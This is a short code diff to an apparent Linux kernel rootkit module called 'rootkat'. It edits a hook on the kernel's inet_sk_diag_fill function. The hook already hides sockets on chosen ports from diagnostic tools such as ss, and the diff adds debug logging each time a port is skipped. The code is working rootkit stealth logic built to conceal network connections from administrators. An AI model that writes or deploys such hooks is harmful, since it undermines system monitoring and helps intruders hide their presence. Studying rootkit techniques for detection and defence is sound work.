@@ -49,9 +49,14 @@ static int rootkat_inet_sk_diag_fill(struct sock *sk,
 {
 	inet_sk_diag_fill_t orig =
 		(inet_sk_diag_fill_t)hook_inet_sk_diag_fill.original;
+	u16 port = sk ? sk->sk_num : 0;
 
-	if (sk && rootkat_is_port_hidden(sk->sk_num))
+	pr_info_once(TAG "hook fired (first call); port=%u\n", port);
+
+	if (sk && rootkat_is_port_hidden(port)) {
+		pr_info(TAG "skipping port %u\n", port);
 		return 0;
+	}
 
 	return orig(sk, icsk, skb, cb, req, nlmsg_flags, net_admin);
 }
